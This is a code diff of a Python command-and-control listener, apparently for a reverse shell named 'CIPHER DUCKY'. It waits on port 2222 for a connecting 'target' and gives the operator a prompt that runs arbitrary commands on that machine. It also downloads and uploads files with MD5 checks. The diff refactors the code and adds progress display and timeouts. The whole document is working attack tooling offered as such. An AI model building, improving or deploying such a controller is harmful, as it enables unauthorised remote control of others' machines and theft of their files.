@@ -8,54 +8,52 @@ import sys
 import hashlib
 import time
 
-
 HOST_IP = '0.0.0.0'
 PORT = 2222
 CHUNK_SIZE = 8192
 
 def calculate_md5(filename):
-    """Calculate MD5 hash of file"""
     md5_hash = hashlib.md5()
     with open(filename, "rb") as f:
         for chunk in iter(lambda: f.read(4096), b""):
             md5_hash.update(chunk)
     return md5_hash.hexdigest()
 
-def send_command(data):
+def send_command(sock, data):
     try:
         jsondata = json.dumps(data)
-        target.sendall(jsondata.encode())  # Use sendall for reliable transmission
+        sock.sendall(jsondata.encode())
         return True
     except socket.error as e:
         print(termcolor.colored(f"\n[!] Error sending command: {e}", "red"))
         return False
 
-def receive_output():
+def receive_output(sock, timeout=10):
     data = ''
-    target.settimeout(10)
+    sock.settimeout(timeout)
     try:
         while True:
             try:
-                data += target.recv(1024).decode().rstrip()
+                chunk = sock.recv(1024).decode()
+                if not chunk:
+                    return None
+                data += chunk
                 return json.loads(data)
             except json.JSONDecodeError:
                 continue
             except socket.timeout:
-                if data:
-                    return json.loads(data)
                 print(termcolor.colored("\n[!] Timeout waiting for response", "yellow"))
                 return None
     except Exception as e:
         print(termcolor.colored(f"\n[!] Error receiving output: {e}", "red"))
         return None
     finally:
-        target.settimeout(None)
+        sock.settimeout(None)
 
-def receive_file(target_filename):
-    """Receive file from target with chunked transfer and verification"""
+def receive_file(sock, target_filename):
     try:
         # Get metadata from target
-        metadata = receive_output()
+        metadata = receive_output(sock)
         if not metadata or isinstance(metadata, str):
             print(termcolor.colored("[!] Failed to receive file metadata", "red"))
             return False
@@ -66,66 +64,77 @@ def receive_file(target_filename):
         print(termcolor.colored(f"[*] Receiving file: {target_filename} ({filesize} bytes)", "yellow"))
         
         # Signal ready to receive
-        send_command("READY")
+        send_command(sock, "READY")
 
         # Receive file in chunks
         md5_hash = hashlib.md5()
         bytes_received = 0
+        start_time = time.time()
         
         with open(target_filename, 'wb') as f:
             while bytes_received < filesize:
-                chunk = target.recv(min(CHUNK_SIZE, filesize - bytes_received))
+                # Add timeout for each chunk
+                if time.time() - start_time > 30:  # 30 second timeout
+                    print(termcolor.colored("[!] File transfer timed out", "red"))
+                    return False
+                    
+                remaining = filesize - bytes_received
+                chunk_size = min(CHUNK_SIZE, remaining)
+                chunk = sock.recv(chunk_size)
+                
                 if not chunk:
                     break
+                    
                 f.write(chunk)
                 md5_hash.update(chunk)
                 bytes_received += len(chunk)
+                
+                # Print progress
+                progress = (bytes_received / filesize) * 100
+                print(f"\rProgress: {progress:.1f}%", end="")
 
-        # Check for incomplete transfer
+        print()  # New line after progress
+
         if bytes_received != filesize:
             print(termcolor.colored("[!] File transfer incomplete", "red"))
             return False
 
-        # Verify transfer
         received_md5 = md5_hash.hexdigest()
-        success = received_md5 == expected_md5
-        
-        if success:
-            print(termcolor.colored(f"[+] File {target_filename} downloaded successfully", "green"))
-        else:
+        if received_md5 != expected_md5:
             print(termcolor.colored("[!] File verification failed", "red"))
-        
-        return success
+            print(f"Expected MD5: {expected_md5}")
+            print(f"Received MD5: {received_md5}")
+            return False
+            
+        print(termcolor.colored(f"[+] File {target_filename} downloaded successfully", "green"))
+        return True
 
     except Exception as e:
         print(termcolor.colored(f"\n[!] Error receiving file: {str(e)}", "red"))
         return False
 
-def send_file(filename):
-    """Send file to target with chunked transfer and verification"""
+def send_file(sock, filename):
     try:
         if not os.path.exists(filename):
             print(termcolor.colored(f"[!] File {filename} not found", "red"))
+            send_command(sock, f"[!] File {filename} not found")
             return False
 
         filesize = os.path.getsize(filename)
         md5_hash = calculate_md5(filename)
         
-        # Send file metadata
         metadata = {
             'filename': os.path.basename(filename),
             'filesize': filesize,
             'md5': md5_hash
         }
-        send_command(metadata)
+        send_command(sock, metadata)
 
-        # Wait for ready signal
-        response = receive_output()
+        response = receive_output(sock)
         if response != "READY":
             print(termcolor.colored("[!] Target not ready to receive file", "red"))
             return False
 
-        # Send file in chunks
         print(termcolor.colored(f"[*] Sending file: {filename} ({filesize} bytes)", "yellow"))
         bytes_sent = 0
         
@@ -134,16 +143,20 @@ def send_file(filename):
                 chunk = f.read(CHUNK_SIZE)
                 if not chunk:
                     break
-                target.sendall(chunk)
+                sock.sendall(chunk)
                 bytes_sent += len(chunk)
+                
+                # Print progress
+                progress = (bytes_sent / filesize) * 100
+                print(f"\rProgress: {progress:.1f}%", end="")
 
-        # Check for incomplete transfer
+        print()  # New line after progress
+
         if bytes_sent != filesize:
             print(termcolor.colored("[!] File transfer incomplete", "red"))
             return False
 
-        # Get confirmation from target
-        result = receive_output()
+        result = receive_output(sock)
         if result and result.get('success'):
             print(termcolor.colored(result['message'], "green"))
             return True
@@ -172,33 +185,50 @@ File Transfer Examples:
     """
     print(termcolor.colored(help_text, "cyan"))
 
-def shell():
+def shell(sock):
     while True:
         try:
             command = input(termcolor.colored("#-cipher-Ducky >> ", "blue")).strip()
             if not command:
                 continue
 
+            if command == "help":
+                print_help()
+                continue
+                
+            if command == "clear":
+                os.system('cls' if os.name == 'nt' else 'clear')
+                continue
+
+            # Handle file transfers
+            if command.startswith("download "):
+                filename = command.split(" ", 1)[1].strip()
+                if not send_command(sock, command):
+                    continue
+                receive_file(sock, filename)
+                continue
+                
+            if command.startswith("upload "):
+                filename = command.split(" ", 1)[1].strip()
+                if not send_command(sock, command):
+                    continue
+                send_file(sock, filename)
+                continue
+
             # Send the command to the target
-            if not send_command(command):
+            if not send_command(sock, command):
                 print(termcolor.colored("[!] Failed to send command", "red"))
                 continue
 
-            # Wait for and print the command output
-            start_time = time.time()
-            while True:
-                if time.time() - start_time > 15:  # Timeout after 15 seconds
-                    print(termcolor.colored("[!] Command timed out", "red"))
-                    break
-
-                response = receive_output()
-                if response is None:
-                    break  # Connection lost
-                elif response == "PING":
-                    continue  # Ignore keep-alive packets
-                else:
-                    print(response)
-                    break  # Exit after receiving command output
+            # Handle response
+            response = receive_output(sock)
+            if response is None:
+                print(termcolor.colored("[!] No response from target", "red"))
+                break
+            elif response == "PING":
+                continue
+            else:
+                print(response)
 
         except KeyboardInterrupt:
             print(termcolor.colored("\n[!] Use ':kill' to terminate the session", "yellow"))
@@ -207,21 +237,20 @@ def shell():
         except Exception as e:
             print(termcolor.colored(f"\n[!] Error in shell: {str(e)}", "red"))
             break
+
 def signal_handler(sig, frame):
     print(termcolor.colored("\n[!] Server shutting down...", "red"))
     try:
-        send_command(":kill")
-        target.close()
         server.close()
     except:
         pass
     sys.exit(0)
 
 def main():
-    global server, target
+    global server
 
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow port reuse
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     try:
         server.bind((HOST_IP, PORT))
@@ -230,18 +259,18 @@ def main():
         print(termcolor.colored("[*] Waiting for incoming connections...", "yellow"))
 
         while True:
-            target, ip = server.accept()
-            print(termcolor.colored(f"\n[+] Target connected from {ip[0]}:{ip[1]}", "green"))
+            client_socket, address = server.accept()
+            print(termcolor.colored(f"\n[+] Target connected from {address[0]}:{address[1]}", "green"))
 
             ascii_art = text2art("CIPHER DUCKY", "random")
             print(termcolor.colored(ascii_art, "red"))
             print_help()
 
-            shell()
+            shell(client_socket)
             
             print(termcolor.colored("\n[*] Session ended. Waiting for new connection...", "yellow"))
             try:
-                target.close()
+                client_socket.close()
             except:
                 pass
 
